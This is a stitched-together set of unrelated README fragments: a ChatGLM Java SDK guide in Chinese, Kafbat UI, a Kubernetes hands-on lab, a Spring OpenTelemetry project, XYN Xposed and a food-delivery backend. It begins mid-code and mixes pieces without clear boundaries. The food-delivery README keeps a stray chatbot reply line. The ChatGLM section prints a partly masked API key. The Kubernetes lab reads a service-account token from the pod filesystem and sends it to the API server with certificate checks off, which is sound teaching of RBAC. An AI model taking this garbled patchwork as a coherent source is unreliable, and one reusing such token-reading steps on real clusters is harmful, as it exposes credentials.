- (UIImage*)getUIImage{
    UIImage *image = ((UIImage* (*)(id, SEL))objc_msgSend)(objc_getClass(""CropperFrameProcessorPlugin""), sel_registerName(""getBitmap""));
    return image;
}
```

You have to pass `{saveBitmap: true}` for the `crop` function.

## 👣目录

1. 组件配置
2. 功能测试
   1. 代码执行 - `使用：代码的方式主要用于程序接入`
   2. 脚本测试 - `测试：生成Token，直接通过HTTP访问Ai服务`
3. 程序接入

## 1. 组件配置

- 申请ApiKey：[https://open.bigmodel.cn/usercenter/apikeys](https://open.bigmodel.cn/usercenter/apikeys) - 注册申请开通，即可获得 ApiKey
- 运行环境：JDK 1.8+
- maven pom - `未推送到Maven中央仓库，需要下载代码本地 install 后使用`

## 2. 功能测试

### 2.1 代码执行

```java
@Slf4j
public class ApiTest {

    private OpenAiSession openAiSession;

    @Before
    public void test_OpenAiSessionFactory() {
        // 1. 配置文件
        Configuration configuration = new Configuration();
        configuration.setApiHost(""https://open.bigmodel.cn/"");
        configuration.setApiSecretKey(""4e087e4135306ef4a676f0cce3cee560.sgP2*****"");
        // 2. 会话工厂
        OpenAiSessionFactory factory = new DefaultOpenAiSessionFactory(configuration);
        // 3. 开启会话
        this.openAiSession = factory.openSession();
    }

    /**
     * 流式对话
     */
    @Test
    public void test_completions() throws JsonProcessingException, InterruptedException {
        // 入参；模型、请求信息
        ChatCompletionRequest request = new ChatCompletionRequest();
        request.setModel(Model.CHATGLM_LITE); // chatGLM_6b_SSE、chatglm_lite、chatglm_lite_32k、chatglm_std、chatglm_pro
        request.setPrompt(new ArrayList<ChatCompletionRequest.Prompt>() {
            private static final long serialVersionUID = -7988151926241837899L;

            {
                add(ChatCompletionRequest.Prompt.builder()
                        .role(Role.user.getCode())
                        .content(""写个java冒泡排序"")
                        .build());
            }
        });

        // 请求
        openAiSession.completions(request, new EventSourceListener() {
            @Override
            public void onEvent(EventSource eventSource, @Nullable String id, @Nullable String type, String data) {
                ChatCompletionResponse response = JSON.parseObject(data, ChatCompletionResponse.class);
                log.info(""测试结果 onEvent：{}"", response.getData());
                // type 消息类型，add 增量，finish 结束，error 错误，interrupted 中断
                if (EventType.finish.getCode().equals(type)) {
                    ChatCompletionResponse.Meta meta = JSON.parseObject(response.getMeta(), ChatCompletionResponse.Meta.class);
                    log.info(""[输出结束] Tokens {}"", JSON.toJSONString(meta));
                }
            }

            @Override
            public void onClosed(EventSource eventSource) {
                log.info(""对话完成"");
            }
        });

        // 等待
        new CountDownLatch(1).await();
    }

}
```

- 这是一个单元测试类，也是最常使用的流式对话模式。

### 2.2 脚本测试

```java
@Test
public void test_curl() {
    // 1. 配置文件
    Configuration configuration = new Configuration();
    configuration.setApiHost(""https://open.bigmodel.cn/"");
    configuration.setApiSecretKey(""4e087e4135306ef4a676f0cce3cee560.sgP2D****"");
    // 2. 获取Token
    String token = BearerTokenUtils.getToken(configuration.getApiKey(), configuration.getApiSecret());
    log.info(""1. 在智谱Ai官网，申请 ApiSeretKey 配置到此测试类中，替换 setApiSecretKey 值。 https://open.bigmodel.cn/usercenter/apikeys"");
    log.info(""2. 运行 test_curl 获取 token：{}"", token);
    log.info(""3. 将获得的 token 值，复制到 curl.sh 中，填写到 Authorization: Bearer 后面"");
    log.info(""4. 执行完步骤3以后，可以复制直接运行 curl.sh 文件，或者复制 curl.sh 文件内容到控制台/终端/ApiPost中运行"");
}
```

```java
curl -X POST \
        -H ""Authorization: Bearer <把获得的Token填写这，并去掉两个尖括号>"" \
        -H ""Content-Type: application/json"" \
        -H ""User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)"" \
        -H ""Accept: text/event-stream"" \
        -d '{
        ""top_p"": 0.7,
        ""sseFormat"": ""data"",
        ""temperature"": 0.9,
        ""incremental"": true,
        ""request_id"": ""xfg-1696992276607"",
        ""prompt"": [
        {
        ""role"": ""user"",
        ""content"": ""写个java冒泡排序""
        }
        ]
        }' \
  http://open.bigmodel.cn/api/paas/v3/model-api/chatglm_lite/sse-invoke
```

- 运行后你会获得一个 Token 信息，之后在 curl.sh 中替换  Authorization: Bearer 后面的值。就可以执行测试了。

## 3. 程序接入

SpringBoot 配置类

```java
@Configuration
@EnableConfigurationProperties(ChatGLMSDKConfigProperties.class)
public class ChatGLMSDKConfig {

    @Bean
    @ConditionalOnProperty(value = ""chatglm.sdk.config.enabled"", havingValue = ""true"", matchIfMissing = false)
    public OpenAiSession openAiSession(ChatGLMSDKConfigProperties properties) {
        // 1. 配置文件
        cn.bugstack.chatglm.session.Configuration configuration = new cn.bugstack.chatglm.session.Configuration();
        configuration.setApiHost(properties.getApiHost());
        configuration.setApiSecretKey(properties.getApiSecretKey());

        // 2. 会话工厂
        OpenAiSessionFactory factory = new DefaultOpenAiSessionFactory(configuration);

        // 3. 开启会话
        return factory.openSession();
    }

}

@Data
@ConfigurationProperties(prefix = ""chatglm.sdk.config"", ignoreInvalidFields = true)
public class ChatGLMSDKConfigProperties {

    /** 状态；open = 开启、close 关闭 */
    private boolean enable;
    /** 转发地址 */
    private String apiHost;
    /** 可以申请 sk-*** */
    private String apiSecretKey;

}
```

```java
@Autowired(required = false)
private OpenAiSession openAiSession;
```

- 注意：如果你在服务中配置了关闭启动 ChatGLM SDK 那么注入 openAiSession 为 null

yml 配置

```pom
# ChatGLM SDK Config
chatglm:
  sdk:
    config:
      # 状态；true = 开启、false 关闭
      enabled: false
      # 官网地址 
      api-host: https://open.bigmodel.cn/
      # 官网申请 https://open.bigmodel.cn/usercenter/apikeys
      api-secret-key: 4e087e4135306ef4a676f0cce3cee560.sgP2DUs*****

# The Interface
Kafbat UI wraps major functions of Apache Kafka with an intuitive user interface.

![Interface](documentation/images/Interface.gif)

## Topics
Kafbat UI makes it easy for you to create topics in your browser by several clicks,
pasting your own parameters, and viewing topics in the list.

![Create Topic](documentation/images/Create_topic_kafka-ui.gif)

It's possible to jump from connectors view to corresponding topics and from a topic to consumers (back and forth) for more convenient navigation.
connectors, overview topic settings.

![Connector_Topic_Consumer](documentation/images/Connector_Topic_Consumer.gif)

### Messages
Let's say we want to produce messages for our topic. With the Kafbat UI we can send or write data/messages to the Kafka topics without effort by specifying parameters, and viewing messages in the list.

![Produce Message](documentation/images/Create_message_kafka-ui.gif)

## Schema registry
There are 3 supported types of schemas: Avro®, JSON Schema, and Protobuf schemas.

![Create Schema Registry](documentation/images/Create_schema.gif)

Before producing avro/protobuf encoded messages, you have to add a schema for the topic in Schema Registry. Now all these steps are easy to do
with a few clicks in a user-friendly interface.

![Avro Schema Topic](documentation/images/Schema_Topic.gif)

# Getting Started

To run Kafbat UI, you can use either a pre-built Docker image or build it (or a jar file) yourself.

## Quick start (Demo run)

```
docker run -it -p 8080:8080 -e DYNAMIC_CONFIG_ENABLED=true ghcr.io/kafbat/kafka-ui
```

Then access the web UI at [http://localhost:8080](http://localhost:8080)

The command is sufficient to try things out. When you're done trying things out, you can proceed with a [persistent installation](https://ui.docs.kafbat.io/quick-start/persistent-start)

## Kubernetes  Guides

### Networking

The purpose of [this website](https://www.tkng.io/) is to provide an overview of various Kubernetes networking components with a specific focus on exactly how they implement the required functionality.

The guide is split into multiple parts which can be studied mostly independently, however they all work together to provide a complete end-to-end cluster network abstractions.

Where possible, every topic in this guide will include a dedicated [hands-on labs](https://www.tkng.io/lab/) which can be spun up locally in a matter of minutes. 

### Security

### Kubernetes Secrets are not secret

Secrets are resources containing keys with base64 encoded values. Secrets are not encrypted by default, they are only encoded and can get decoded easily by everyone who has access to a namespace or to the whole cluster.

Secret values can be exposed to pods as environment variables or mounted as files.

In order to create a secret from a text file, you can run the following, This creates a generic secret named secretname and automatically encodes the value as base64:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
echo -n ""yourvalue"" > ./secret.txt
k create secret generic secretname --from-file=./secret.txt
k describe secrets secretname
k get secret secretname -o yaml
echo 'eW91cnZhbHVl' | base64 --decode
# or
k create secret generic mysecret --dry-run -o yaml --from-file=./secret.txt > secret.yaml
k create -f secret.yaml
# or
k create secret generic mysecret --dry-run -o yaml --from-literal=secret.txt=yourvalue > secret.yaml
```
</p>
</details>

Since K8s secrets are not so secret, there are some ways to keep you secrets secret:

### Kubernetes ConfigMaps

A ConfigMap is an object consisting of key-value pairs which can be injected into your application.

With a ConfigMap you can separate configuration from your Pods. This way, you can prevent hardcoding configuration data.

ConfigMaps are useful for storing and sharing non-sensitive, unencrypted configuration information. Sensitive information should be stored in a Secret instead.

Exercise:

Create a ConfigMap named kubernauts that contains a key named dev with the value ops.

With the --from-literal argument passed to the k create configmap command you can create a ConfigMap containing a text value.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k create cm kubernauts --from-literal=dev=ops --dry-run -o yaml > cm-kubernauts.yaml
cat cm-kubernauts.yaml
echo -n ""ops"" > dev
k create cm kubernauts --from-file=./dev
k get cm
k describe cm kubernauts
k delete cm kubernauts
k create -f cm-kubernauts.yaml
k describe cm kubernauts
```
</p>
</details>

Using this ConfigMap, we can inject data in our application:

## Whoami, Whoareyou and Whereami Problems

### What We’ll Do

We’ll use a pre-made container — containous/whoami — capable of telling you where it is hosted and what it receives when you call it.

If you'd like to build the container image with docker, do:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
git clone https://github.com/containous/whoami.git
docker build -t whoami .
docker tag whoami kubernautslabs/whoami
docker push kubernautslabs/whoami
docker images | head
```

</p>
</details>

We’ll define two different deployments, a whoami and a whoareyou deployment that will use `containous/whoami` container image.

We’ll create a deployment to ask Kubernetes to deploy 2 replicas of whoami and 3 replicas of whoareyou.

We’ll define two services, one for each of our Pods.

We’ll define Ingress objects to define the routes to our services to the outside world.

We’ll use our Nginx Ingress Controller on our Rancher Cluster.

Explanations about the file content of whoami-deployment.yaml:

We define a “deployment” (kind: Deployment)

The name of the object is “whoami-deployment” (name: whoami-deployment)

We want two replica (replicas: 2)

It will deploy pods that have the label app:whoami (selector: matchLabels: app:whoami)

Then we define the pods with the (template: …) which will have the whoami label (metadata:labels:app:whoami)

The Pods will host a container using the image containous/whoami (image:containous/whoami)

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k apply -f 1-whoami-deployment.yaml
k get all
# we expose the deployment with a service of type ClusterIP
k create -f 1-whoami-service-ClusterIP.yaml
k get svc
k port-forward service/whoami-service 8080:80
# in a new terminal session call
curl 127.0.0.1:8080
k delete svc whoami-service
# create a service of type NodePort
k create -f 1-whoami-service-nodeport.yaml
k get svc
curl csky08:30056 # adapt the nodeport for your env. please !
curl csky09:30056
curl csky10:30056
k delete svc whoami-service-nodeport
k create -f 1-whoami-service-loadbalancer.yaml
k get svc
curl <EXTERNAL-IP> # the external-ip is given from the LB IP pool above
k create -f 2-whoareyou-all.yml
k get all
k get svc
k get ing
curl <HOSTS value from ingress>
# are you happy? ;-)

## DNS based Service discovery with whereami kubia pod

### What We’ll Do

We'll use a slightly extended node.js app (which is a simple web server) from the [Kubernetes in Action book by Marko Lukša](https://www.amazon.com/-/en/Marko-Luksa/dp/1617293725) in 2 different namespaces ns1 and ns2 to demonstrate the DNS based services discovery. 

A service provides a Virtual IP (VIP) address, which means the Service IP is not bound to a physical network interface. A service acts like an internal loadbalancer in K8s! The magic of of routing trafic through the VIP is implemented by IPtable rules managed by kube-proxy!

A service can be called through its FQDN in the form of:

`$SERVICE_NAME.$NAMESPACE.svc.cluster.local`

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd whereami
k create ns ns1
k create ns ns2
kn ns1
cat kubia-deployment.yaml   
k create -f kubia-deployment.yaml
k create -f kubia-deployment.yaml -n ns2
k expose deployment kubia
k get svc
k expose deployment kubia -n ns2
k get svc -n ns2
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k scale deployment kubia -n ns2 --replicas 3
# repeat the service call many times and see how loadbalancing works
k exec -it kubia-<press tab> -- curl kubia.ns2.svc.cluster.local:8080
k exec -n ns2 -it kubia-<press tab> -- curl kubia.ns1.svc.cluster.local:8080
k exec -it kubia-<press tab> -- ping kubia.ns2.svc.cluster.local
--> PING kubia.ns2.svc.cluster.local (10.43.109.89) 56(84) bytes of data.
# you don't get any pong, why?
# ssh into a node and examine the IPtable rules
sudo iptables-save | grep kubia
```

### Headless Services for Stickiness

![hadless](images/headless-cluster-ip.png ""headless-cluster-ip"")

As we learned services are exposed by default through the type ClusterIP, they work as an internal layer 4 load-balancer and provide a VIP with a stable DNS address, where the clients can connect to. The service forwards the connections to one of the pods which are backing the service via round robin.

This works fine and is desired for stateless apps which need to connect to one of the pods randomly and gain more performance through trafic routing via load balancing.

But in some cases where stickiness is needed and the clients need to connect to a particular pod for session or data stickiness, then we need to define our service without ClusterIP, which is by default the head of the service (that's the VIP).

To do that we need to define our service as a `headless` service, let's see that in action with the whereami service and our utils pod.

In the following we expose the kubia deployment as a headless service by setting the ClusterIP to `None`, scale the deployment and do a DNS query to both services with `host kubia-headless` and `host kubia-clusterip` from within the util client pod. As you'll see our client pod always connects to the first IP from the DNS response, if we curl the headless service. This means no load balancing happens, the call is `Sticky`!

The second curl to the service with ClusterIP does load balancing and distributes the traffic between pods.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k delete svc kubia
k expose deployment kubia --name kubia-headless --cluster-ip None
k expose deployment kubia --name kubia-clusterip
k expose deployment kubia --name kubia-lb --type=LoadBalancer
k scale deployment kubia --replicas 3
k run --generator=run-pod/v1 utils -it --image kubernautslabs/utils -- bash
# inside the utils container
host kubia-headless
host kubia-clusterip
# what is the difference here?
for i in $(seq 1 10) ; do curl kubia-headless:8080; done
# hits kubia only on one node? 
for i in $(seq 1 10) ; do curl kubia-clusterip:8080; done
# does load balancing via the head ;-)
exit
mkcert '*.whereami.svc'
k create secret tls whereami-secret --cert=_wildcard.whereami.svc.pem --key=_wildcard.whereami.svc-key.pem
cat kubia-ingress-tls.yaml
k create -f kubia-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.whereami.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
curl https://my.whereami.svc
for i in $(seq 1 10) ; do curl https://my.whereami.svc; done
# the ingress controller does load balancing, although the kubia-headless is defined as the backend with serviceName: kubia-headless!
```

</p>
</details>

## Ingress with TLS

![ingress-controller](images/ingress-controller-traefik.png ""ingress-controller-traefik"")

Often we need to use an ingress object to provide path based or (sub-) domain based routing with TLS termination and other capabilities defined through annotations in the ingress resource.

By creating an ingress for a service, the ingress controller will create a single entry-point to the defined service in the ingress resource on every node in the cluster.

In the follwoing we're using the traefik ingress controller and an ingress object to provide path based or (sub-) domain based routing with TLS termination with a valid mkcert made TLS certificate on our lab environment.


<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cd ..
kn default
mkcert '*.ghost.svc'
k create secret tls ghost-secret --cert=_wildcard.ghost.svc.pem --key=_wildcard.ghost.svc-key.pem
# alternatively, if you can't or you don't want to use mkcert, you can create a selfsigned cert with:
# openssl genrsa -out tls.key 2048
# openssl req -new -x509 -key tls.key -out tls.cert -days 360 -subj /CN=my.ghost.svc
# k create secret tls ghost-secret --cert=tls.cert --key=tls.key
cat 3-ghost-deployment.yaml
k create -f 3-ghost-deployment.yaml
k expose deployment ghost --port=2368
cat 3-ghost-ingress-tls.yaml
k create -f 3-ghost-ingress-tls.yaml
# Please provide the host entry mapping in your /etc/hosts file like this:
# 192.168.64.23 my.ghost.svc admin.ghost.svc
# the IP should be the IP of the traefik loadbalancer / ingress controller
open https://my.ghost.svc
open https://admin.ghost.svc/ghost
# change the service type to LoadBalancer and access ghost with the loadbalancer IP on port 2368 or on any other node (works on k3s with trafik only), e.g.:
open http://node2:2368
# scale the deployment to have 2 replicas and see how the backend ghost backened https://admin.ghost.svc/ghost doesn't work.
```

## Multi-Container Pods

Create a Pod with two containers, both with image alpine and command ""echo hello; sleep 3600"". Connect to the second container and run 'ls'.

The easiest way to do it is to create a pod with a single container and save its definition in a YAML file and extend it with an additional container:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k run alpine-2-containers --image=alpine --restart=Never -o yaml --dry-run -- /bin/sh -c 'echo hello;sleep 3600' > alpine-pod.yaml
```

Copy/paste the container related values, so your final YAML should contain the following two containers (make sure those containers have a different name):

```YAML
containers:
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine1
    resources: {}
  - args:
    - /bin/sh
    - -c
    - echo hello;sleep 3600
    image: alpine
    name: alpine2
    resources: {}
```

```yaml
k create -f alpine-pod-2-containers.yaml # alpine-pod-2-containers.yaml is in this repo
# exec / ssh into to the alpine2 container
k exec -it alpine-2-containers -c alpine2 -- sh
ls
exit

# or just an one-liner
k exec -it alpine2 -c alpine2 -- ls

# cleanup
k delete pod alpine-2-containers
```

</p>
</details>


### Shared Volume

We'll extend the above alpine-2-containers with a shared volume of type emptyDir named `share` with a volumeMount for each container with a mountPath `/tmp/share1` and `/tmp/share2` as follow:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
cat alpine-pod-share-volumes.yaml
k apply -f alpine-pod-share-volumes.yaml
k exec -it alpine-2-containers-share-volume -c alpine1 -- sh
touch /tmp/share1/sharefile
echo ""test-share1"" > /tmp/share1/sharefile
cat /tmp/share1/sharefile
exit
k exec -it alpine-2-containers-share-volume -c alpine2 -- cat /tmp/share2/sharefile
```

</p>
</details>

## Security

Kubernetes Security is a huge topic and security hardening is a nice problem which everyone has to implement according to their security requirements and the governance model of their organization. We're going only to scratch the surface of K8s security here and highly recommend to go through the following resources by Michael Hausenblas, Liz Rice and the community.

https://kubernetes-security.info/

https://learn.hashicorp.com/vault/getting-started-k8s/sidecar

https://github.com/k8s-sec/k8s-sec.github.io


### Service Accounts

In K8s each namespace has a default ServiceAccount, named `default`. A ServiceAccount is a namespaced resource used by containers running in a Pod, to communicate with the API server of the Kubernetes cluster. ServiceAccounts with limited permissions are often used to apply the principle of least priviledge.

```bash
k get sa --all-namespaces | grep default
k get sa default -o yaml
k get secret default-<press tab> -o yaml
```

The data key of this Secret has several key/pairs:

```yaml
apiVersion: v1
kind: Secret
data:
  ca.crt: LS0tLS1CRUdJTi...
  namespace: ZGVmYXVsdA==
  token: ZXlKaGJHY2lP...
metadata:
  annotations:
    kubernetes.io/service-account.name: default
...
```

The token is the Base64 encoding of the JWT used to authenticate against the API server.
Let's get the token and head to jwt.io and use the debugger to decode the token.

```bash
kubectl run -it alpine --restart=Never --image=alpine -- sh
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
exit
open https://jwt.io/
```

Paste the token and get the payload, which looks similar to this:

```
{
  ""iss"": ""kubernetes/serviceaccount"",
  ""kubernetes.io/serviceaccount/namespace"": ""default"",
  ""kubernetes.io/serviceaccount/secret.name"": ""default-token-24pbl"",
  ""kubernetes.io/serviceaccount/service-account.name"": ""default"",
  ""kubernetes.io/serviceaccount/service-account.uid"": ""147e134a-43d0-4c76-ad01-bccc59f8acb9"",
  ""sub"": ""system:serviceaccount:default:default""
}
```

We can see the service account default is linked to the namespace where it exists and is using the secret default-token-24pbl. This token is available in the filesystem of each container of the Pod of the attached ServiceAccount.

### Using a Custom ServiceAccount

A Service Account on its own is on not so useful, we need to provide rome rights and permissions to it through a set of rules defined through roles or cluster roles using the RBAC implementation in K8s.  


### RBAC (Role Based Access Control)

RBAC in K8s is activated by default and helps to provide access to resources (objects) like namespaces, pods, services, etc. to those Subjects or Entities like users, group or service accounts who need access to some resources and deny access to other resources who do not need access to them. RBAC increases security in K8s projects and shall be defined through a governance model in each organization (but in the theorie, you know we are all admins ;-)).

RBAC is implemented through Role, ClusterRole, RoleBinding, and ClusterRoleBinding.

#### Role

A Role defines what you or a subject can do to a set of resources, like get, set, delete, etc.A Role contains a set of rules which define a set of permissions. Roles are used to assigning permissions to resources on the namespace level.

#### ClusterRole

Similar to Role, ClusterRole can grant permissions on the Cluster Level such as giving resource permissions across all namespaces in the cluster.

#### RoleBinding and ClusterRoleBinding

RoleBinding and ClusterRoleBinding are used to grant permissions and priviledges to Subjects or Entities on the namespace (project RoleBinding) level or on the cluster level (ClusterRoleBinding).

![RBAC](images/rbac.png ""rbac"")

#### What We’ll Do

We create a new namespace myapp and a new custom ServiceAccount `mysa`, create a new role `podreader` with the permission to get and list pods and create a rolebinding `mypodviewer` to bind the ServiceAccount to the role podreader in the namespace `myapp`.

<details><summary>Expand here to see the solution</summary>
<p>

```yaml
k get clusterroles | wc -l
# 62
k get clusterroles
k describe clusterrole view
k describe clusterrole view | grep pods
# the view role allows your application access to many other resources such as deployments and services.
k create namespace myapp
k -n=myapp create serviceaccount mysa
k -n myapp create role podreader --verb=get --verb=list --resource=pods
k -n myapp describe role/podreader
# nice, the role podreader can only view now, but we need to attach the role podreader to our application, represented by the service account myapp. 
k -n myapp create rolebinding mypodviewer --role=podreader --serviceaccount=myapp:mysa
k -n myapp describe rolebindings mypodviewer
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list pods
# yes :-)
k -n myapp auth can-i --as=system:serviceaccount:myapp:mysa list services
# no :-)
```
</p>
</details>

We extend our alpine pod with the key `serviceAccountName` and the value `mysa`, apply the change and run a shell in the alpine-pod, get the toke belonging to the `mysa` ServiceAccountand use it to list the pods in the default namespace and the myapp namespace to see the differences:

<details><summary>Expand here to see the solution</summary>
<p>

```yaml

kn myapp
cat alpine-pod-service-account.yaml
k apply -f alpine-pod-service-account.yaml
k describe pod alpine-sa
k get sa
k get secrets
k exec -it alpine-sa -- sh
apk add curl
TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/default/pods/ --insecure
curl -H ""Authorization: Bearer $TOKEN"" https://node1:6443/api/v1/namespaces/myapp/pods/ --insecure
# what works, what doesn't work?

```
</p>

# Day 2 Operation

Day 2 operation is mainly about implementing some principles like selfhealing and autoscaling for our apps AND the infrastructure components like nodes and K8s components itself and define resources limits, liveness and readiness probes for our apps, run continious security auditing, apply GitOps principles and style, etc.

In this first section we'll go through app auto scaling with Horizontal Pod Autoscaler.

![hpa](images/pod-autoscaling-hpa.png ""hap"")

## Pod AutoScaling with HPA (Horizontal Pod Autoscaler)

```bash
kubectl run hpa-example --image=k8s.gcr.io/hpa-example --requests=cpu=200m --expose --port=80
# create HPA based on CPU usage
kubectl autoscale deployment hpa-example --cpu-percent=50 --min=1 --max=10
# In another terminal run
kubectl run -i --tty generate-load --image=busybox /bin/sh
# Inside the above container run a loop bash command to stress the CPU
while true; do wget -q -O- http://hpa-example.default.svc.cluster.local; done
# Check HPA Status
kubectl get hpa
```

DGuhr/spring-otel-extended,main,"# spring-otel-extended - Extending Springs instrumentation
This repository provides multiple approaches to (auto)-instrument Spring and Spring Boot using the OpenTelemetry java agent and -Instrumentation.

This is a Work in Progress for now. For current TODOs, see [TODOS](#todo) 
## Use Case
At the time of writing this, when you use the OpenTelemetry Java Agent to auto-instrument a Spring-Application, your traces look like in the following picture:
![pic](assets/currentstate.png)

This is a fine Trace, but there might be something missing in the ""in between"", and especially for bigger (often: over-abstracted / over-architected legacy) apps, such a trace can be very hard to read, because it usually consists of way more database calls, so you have one /GET call and then, say, 10s of DB calls, and then another POST call to a downstream service... and so on.

The idea here is to show the intermediate, Spring-annotated steps like in the following picture:

![pic](assets/targetstate.png)

This is actually the same operation that was done in the first picture, but now we see the chain of callers, so it is possible to really understand what part of your app did the database calls.

I know that this leads to the generation of many spans and is therefore not added to the official auto-instrumentation, see [the otel issue](https://github.com/open-telemetry/opentelemetry-java-instrumentation/issues/2574). So, it might not be suitable in production telemetry, but it certainly helped me a lot to understand the inner workings of unknown/legacy spring and spring boot codebases, where those traces consist of 30+ spans, lots of them looking like random database queries. 

Alternatively, one could surely use tools like the great [Grafana Pyroscope](https://github.com/grafana/pyroscope) continuous profiling tool to achieve the same, but the solutions shown in this repository feel more lightweight to me, as I simply do not need to spin up and maintain another component and integrate another agent to achieve a more high-resolution look into the application.

## Overview

This repository consists of 5 services:
1) `official-auto-otel-animal-app`: A Spring Boot-Application with an example structure using `@Component`,`@Service` and `@Repository`.
2) `aspect-based-otel-animal-app`: The same App as 1), but using Springs AOP to add Spans to all public methods for the intermediate Layers.
3) `otel-javaagent-spring-extension`: An OpenTelemetry Java-Agent [Extension](https://opentelemetry.io/docs/languages/java/automatic/extensions/) that extends the official agent capabilities to record the intermediate spans.
4) `extension-based-otel-animal-app`: An app that uses the Java agent extension from 3) to provide the same functionality as the aspect solution, without ""touching the code"".
5) `legacy-tomcat-spring-app`: (More or less) the same applictaion, but running on a legacy spring 5 stack (plain, without spring boot) on tomcat 9 and jdk11. It also uses the custom java agent extension.

## Observability stack in docker 
The Observability-Stack consists of: 
* The apps, packaged as containers
* An OpenTelemetry Collector where the signals are sent to
* Prometheus for metrics 
* Tempo for Traces
* Grafana for visualization

It is built using containers and compose for the sake of simplicity. It is tested using docker. I am happy to hear if it also works for podman and other container solutions.

## Running the stack

First, build the respective modules using e.g. `mvn clean package` in each of the modules (see [TODO](#todo))

**Note**: If you want to build the javaagent extension for use with the legacy app, you have to change the maven properties `<maven.compiler.source>` and `<maven.compiler.target>` to use 11 instead of 21. Without changing this, the extension does not get picked up by the classloader.

You can start the stack simply by running `docker compose up --build -d` from the root directory of this repository. I added the pre-built `otel-javaagent-spring-extension-jdk11-1.0-SNAPSHOT.jar` for convenience reasons directly to the `legacy-tomcat-spring-app/agent` directory in this repository.

The following endpoints are available when the stack is started:
* `official-auto-otel-animal-app`: Call [http://localhost:8081/animals](http://localhost:8081/animals) 
* `aspect-based-otel-animal-app`: Call [http://localhost:8082/animals](http://localhost:8082/animals)
* `extension-based-otel-animal-app`: Call [http://localhost:8083/animals](http://localhost:8083/animals)
* `legacy-tomcat-spring-app`: Call [http://localhost:8084/animals](http://localhost:8083/animals)
* `Grafana`: Call `http://localhost:3001` to access the dashboard. Prometheus and Tempo data sources are already added. Username and Password: `admin // pass`

To stop the stack, call `docker compose down`. 

If you want to delete the existing data, use `docker compose down -v` to delete the named volumes.

## TODO
- use gradle / maven multi-module to make building the apps more convenient (contribution welcome)


# DONE
- Get the custom java agent extension for complemental spring spans to work. 🥳
- Add Spring legacy example with agent extension 🎊

    // Set up translation parameters
    List < String > targetLanguages = List.of(""pt"", ""es"", ""fr"");
    TranslateParams params =
            new TranslateParams(""Hello World!"", targetLanguages).setSourceLanguage(""en"");

    // Translate the text
    Optional < TranslationResponse > translationResult = api.translate(params).join();

    // Print the translations
    translationResult.ifPresent(
            response ->
                    response.getFirstResult().getTranslations().forEach(ExampleTranslator::logLanguage));
  }

  public static void logLanguage(Translation translation) {
    System.out.println(translation.getLanguageCode() + "": "" + translation.getText());
  }
}

Katana-Official/XYNXposed,master,"## XYN Xposed
#### What's the XYN Xposed?
XYN Xposed is a next generation Xposed framework, which based on the [ART TI](https://source.android.google.cn/docs/core/runtime/art-ti) and will not resolve or hook any unexported symbol from libart.so  
Since Android 15, Google stripped all symbols from libart.so and caused billions of reinforced apps crash.  
Using this framework will not affect the behaviour above Andorid 15 and will only make methods interpret without compiled.  
With the ART TI (ART Tooling Interface), you can debug your app and even integrate it inside [Mundo](https://github.com/Katana-Official/SPatch-Update/releases).  
We're using part of the AOSP feature, which was already included inside the AOSP CTS tests, and won't be removed in the future Android versions, this will be much stable than libart symbol based method. You can read the introduction [here](https://source.android.google.cn/docs/core/runtime/art-ti#validation).

Missuo0o/FoodDeliveryBackend,main,"# Food Delivery Backend System

This is the backend system for a food delivery application, built using Spring Boot. The application leverages a range of technologies including MySQL, Redis, RabbitMQ, and integrates with Alibaba Cloud's OSS and WeChat Pay. This system is designed to be scalable, secure, and efficient, utilizing Spring Boot's extensive support for enterprise-grade applications.

## Configuration

The application is configured to run on port 8080 and is set up with production profiles. It uses MyBatis for ORM, JWT for authentication, and includes advanced logging configurations.

### Technologies Used

- **Spring Boot** - Framework for building Java-based applications.
- **MySQL** - Database for storing user and order data.
- **Redis** - Used as a cache and session store.
- **RabbitMQ** - Messaging broker for handling asynchronous processing.
- **JWT** - For securing REST APIs by providing tokens to verify user identity.
- **MyBatis** - Persistence framework integrating with Spring Boot for data handling.
- **Knife4j** - Enhanced Swagger-compatible interface for visualizing RESTful APIs.
- **Alibaba Cloud OSS** - For storage solutions.
- **WeChat Pay** - Payment integration for handling transactions and refunds.

## Installation

### Prerequisites

You need the following installed on your system:

- Java JDK 23
- Maven
- MySQL
- RabbitMQ
- Redis

### Setup

1. Clone the repository:

   ```bash
   git clone https://github.com/yourusername/food-delivery-backend.git
   ```

2. Navigate to the project directory:

   ```bash
   cd food-delivery-backend
   ```

3. Install dependencies:

   ```bash
   mvn install
   ```

### Configuration

Update the `application.yml` or `application.properties` with your specific settings for MySQL, Redis, RabbitMQ, OSS, and WeChat Pay. This typically includes hosts, ports, usernames, passwords, and other essential configuration details.

Certainly! Here's the section of the README updated to reflect how to run the application using the `java -jar` command instead of Maven directly:

---

## Running the Application

Instead of using Maven to run the application, you can build a jar file and run it directly using the Java command. This is often more suitable for production environments or when deploying the application.

1. First, package the application into a runnable jar file with Maven:

   ```bash
   mvn clean package
   ```

   This command will create a `.jar` file in the `target` directory.

2. Run the application using:

   ```bash
   java -jar target/your-application-name.jar
   ```

   Replace `your-application-name.jar` with the actual name of your jar file generated by Maven.

The application will start running on `http://localhost:8080`.

---

## API Documentation

API documentation is available via Swagger UI and Knife4j at:

- **Swagger UI**: [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
- **Knife4j**: [http://localhost:8080/doc.html](http://localhost:8080/doc.html)

## Security

This application uses JWT for authentication. Ensure you configure your JWT settings properly, including secret keys and token names for both admin and user levels.

## Contributing

